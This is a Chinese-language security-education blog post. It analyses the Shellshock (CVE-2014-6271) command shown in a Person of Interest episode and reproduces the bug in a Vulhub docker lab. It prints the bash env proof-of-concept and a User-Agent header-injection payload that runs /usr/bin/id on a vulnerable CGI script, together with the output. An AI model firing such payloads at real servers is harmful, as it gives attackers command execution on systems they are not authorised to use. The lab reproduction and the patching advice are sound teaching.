---
title: 你是不是要玩死我呀 - 疑犯追蹤 Person of Interest S04E11 (IF-THEN-ELSE)
date: 2024-05-02 00:56:04
tags: 
    - secuirty
    - 資訊安全
    - 看電影學資安
    - drama
    - Person of Interest
description: "看電影學資安：疑犯追蹤 S04E11 劇中出現的 Shellshock（CVE-2014-6271）攻擊指令，分析這段 PoC 的正確性與實際可利用性，順便吐槽戲劇裡的駭客畫面。"
categories:
    - 看電影學資安
cover: /images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/3.webp
---
![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/1.webp)

疑犯追蹤劇照，圖片來源：primevideo.com

嗨，大家好，我是[ISDA](https://www.isda.org.tw/)的Walter，趁著最近有空把很久之前發現的美劇資安部分寫一下，因新冠肺炎(COVID-19)的疫情關係上半年協會活動較少，但之後應該會漸漸開設課程，再請大家多多關注，本人才疏學淺文章中如有錯誤之處還請不吝指教

[疑犯追蹤(Person of Interest)](https://zh.wikipedia.org/wiki/%E7%96%91%E7%8A%AF%E8%BF%BD%E8%B8%AA)是一部2011開始播放的美劇，由非常有名的諾蘭兄弟中的弟弟Jonathan Nolan的創作之一，故事是從電腦天才[Harold Finch](https://baike.baidu.com/item/%E5%AE%85%E6%80%BB/8585825?fromtitle=Harold+Finch&fromid=19819276)與身手不凡的前CIA探員[John Reese](https://baike.baidu.com/item/John%20Reese/20458184)開始，Harold創造出超強的人工智慧The Machine與運用國家級的資源監看所有人預測兇案聯手好身手的John加以預防，故事到了後半段更有其他有趣的角色加入，也加入了許多資訊工作者會懂的有趣彩蛋，是值得細細品味的一部好劇，我自己大概也從頭到尾看了三次了XD

以下有雷請注意

=======防雷分隔線=======

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/2.webp)

要進入請小心的防雷圖。圖片來源：[MMMMM_禾野男孩](https://twitter.com/mnmmmm_hynh)

=======防雷分隔線=======

而我們這次所要講的是在第4季第11集中的部分，他們遇到前所未有的強敵 — 另外一個人工智慧Samaritan，Samaritan想運用他的資源與技術造成美國股市的崩盤，Harold他們為了不讓世界造成恐慌即全力阻止Samaritan，但為了阻止Samaritan必須進交易所安裝反制的程式駭入系統，殊不知此為Samaritan的陷阱，就在他們被困住的時候The Machine運用他強力的模擬功能預測最可行的逃脫方案，其中一個模擬方案便是請懂電腦的Finch小組去解鎖電梯，較為不懂電腦技術的Reese小組去安裝程式，結果在Reese輸入駭客程式的畫面竟然出現了資安人應該都很熟悉的指令

```base
env x='(){ :;}; echo vulnerable' bash-c
```

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/3.webp)

攻擊畫面與指令圖片來源：Person of Interest 劇中畫面

這個不就是2014年9月紅極一時[CVSSSv2滿分10分](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271)的大漏洞[shellshock](https://www.ithome.com.tw/tags/shellshock)(CVE-2014–6271)嗎？但是仔細一看，發現以下幾個問題：

雖然畫面上還沒輸入完，但怎麼在被好幾支槍指著的危急時刻還在輸入僅僅只是驗證是否存在漏洞實際上並無攻擊能力的 [PoC(Proof of concept)](https://zh.wikipedia.org/wiki/%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81) 呢，此 PoC 在已經拿到可以下bash的情況下是沒有辦法有更深度的利用，頂多知道bash存在shellshock漏洞，Finch是不是嫉妒Reese太帥想搞死他呀(((ﾟДﾟ;)))
看更仔細發現 bash-c 中間少個空白耶！這樣的 PoC 可能沒辦法正常運行，我們等一下做個測試看看

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/4.webp)

來源：唐伯虎點秋香劇照

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/5.webp)

打錯會哭哭喔。圖片來源：imgflip.com

個人猜測可能是劇組人員想加入真實的攻擊手法但尚未了解其原理，但跟台灣鄉土劇的駭客嘴上說防火牆很難入侵但實際上亂打指令與使用 PPT 還沒全螢幕播放已經好上幾百倍了(拜託台灣連續劇快來找專業的資安人員當顧問呀~~)，而且當疑犯追蹤第四季播出首集也才2014的9月，所以幾乎是公布弱點PoC沒多久就將其編入劇中，已經算是相當用心了

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/6.webp)

windows cmd亂輸入。圖片來源：台灣連續劇-天下女人心劇照

# 漏洞模擬與測試
接下來讓我們來實際測試shellshock弱點看看吧！在研究漏洞的時候光是建立存在漏洞環境就需要許多時間，幸好有Vulhub已經建立了一堆的docker漏洞環境與簡單的Exploit或PoC，我們只需要安裝docker並且下載vulhub的檔案就可以很輕鬆隨意的建立與移除漏洞環境

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/7.webp)

超級方便的漏洞環境建立網站。圖片來源：Vulhub

## 漏洞模擬

我們首先使用VMWare先安裝一個Ubuntu之後依照他的文件或影片複製貼上語法就可以了

如果你的Ubuntu預設沒有curl與git等必要軟體就自己裝一個

```bash
# Install package curl, git
sudo apt install curl, git, net-tools -y
# Download vulhub docker
cd ~/Donwloads && sudo git clone https://github.com/vulhub/vulhub.git
```

接下來是官方的建議，我小量修改

```bash
# If you don't have a docker installed, you'll need to install docker  
curl -s https://get.docker.com/ | sh
# install docker-compose  
sudo apt install docker-compose
# Entry vulnerability directory  
cd ~/Downloads/vulhub/bash/shellshock
# Compile (optional)  
docker-compose build
# Run  
sudo docker-compose up -d
```
查看一下是否正常運作，並且查看開啟的port，預設應該為8080

```bash
ewater@ubuntu:~/Downloads/vulhub/bash/shellshock$ sudo docker ps
CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                  NAMES
b17e8c30a67b        vulhub/bash:4.3.0-with-httpd   "apache2ctl -DFOREGR…"   3 minutes ago       Up 3 minutes        0.0.0.0:8080->80/tcp   shellshock_web_1
```
我們查看一下vulhub.org對於shellshock的[漏洞說明](https://vulhub.org/#/environments/bash/shellshock/)，文件上說了會有兩個cgi程式，分別是safe.cgi與victim.cgi，safe.cgi是用安全版本的bash，victim.cgi是使用存在shellshock漏洞的bash4.3

我們嘗試存取對應的ip:port/path (請依照自己的環境修改)，發現都是顯示Hello world

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/8.webp)

存取對應路徑顯示Hello world代表環境已經正常執行

## 漏洞測試

再來我們就使用駭客神器[Burp Suite](https://portswigger.net/burp)攔截封包，有興趣的小夥伴可以下載免費的Community版本安裝，並且將[proxy設定](https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/browser)為8080，攔截成功之後我們將封包傳送到Burp Suite的repeater，將User-Agent的部分依照vulhub所描述的送到victim.cgi

```bash
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```

果然攻擊成功並且返回我們原本想要執行的/usr/bin/id，顯示了uid, gid等資料

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/9.webp)

利用Burp Suite攔截封包並修改後攻擊shellshock漏洞成功

再來嘗試相同的攻擊語法，僅將路徑改為safe.cgi，果然攻擊失敗了

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/10.webp)

利用Burp Suite攔截封包並修改後攻擊shellshock漏洞失敗


接著我們來嘗試進入docker裡面跑影片中的PoC，發現的確影片中的指令少個空格，系統告訴我們找不到bash-c這個檔案或資料夾，在bash與-c中加入空格之後就成功顯示vulnerable與whoami的結果了

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/11.webp)

進入docker內測試PoC結果

我們嘗試以Ubuntu較新的4.4.20版本bash嘗試看看，發現尚未將bash與-c分開之前仍然是失敗，修改後也只能顯示whoami的結果，並未顯示vulnerable，代表此弱點已經修補

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/12.webp)

於無shellshock漏洞之環境測試PoC結果
假如已經測試完畢記得將docker先停止

```bash
# Stop shellshock docker 
sudo docker stop shellshock_web_1
```

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/13.webp)

停止shellshock之docker環境

如果不想再測試shellshock也可以使用[rm](https://docs.docker.com/engine/reference/commandline/rm/)及[rmi](https://docs.docker.com/engine/reference/commandline/rmi/)指令將它移除

測試完畢後我們來理解一下原理，在linux的環境下可以用設定環境變數甚至function，如下圖於shell中的PoC，綠色部分就是正常使用環境變數，而shellshock就是針對bash 對環境變數的解析上的污染，紅色部分就是攻擊者在環境變數中塞入惡意指令，而藍色部分是當使用bash的時候，此時就會將當初我們設定環境變數裡面的紅色部分惡意指令也執行

![](/images/CyberSec-in-movie-Person-of-Interest-S04E11(IF-THEN-ELSE)/14.webp)

shellshock原理。圖片來源：OWASP


而從外面的攻擊就是因為伺服器會將 HTTP Header中(剛才例子中使用User-Agent)之內容透過module放入環境變數中，若伺服器程式呼叫到 bash，就會受到惡意語法的影響

此弱點為2014年9月的弱點，如果你有好好的在更新上Patch應該是不太需要擔心此問題，若是擔心可以參考[DEVCORE](https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/)的文章進行評估與修補

文章就先寫到這邊，如果小夥伴們對資安有興趣或者想分享電影或劇集也可以在ISDA的[Line](https://line.me/ti/g2/SNoL28VLRMkim1zj8VNP9A)或[Telegram](https://t.me/ISDATW)找到我，與我的小夥伴們一起學資安！

參考：
* https://personofinterest.fandom.com/wiki/If-Then-Else
* https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/
* https://timhsu.chroot.org/2014/10/bash-shellshock.html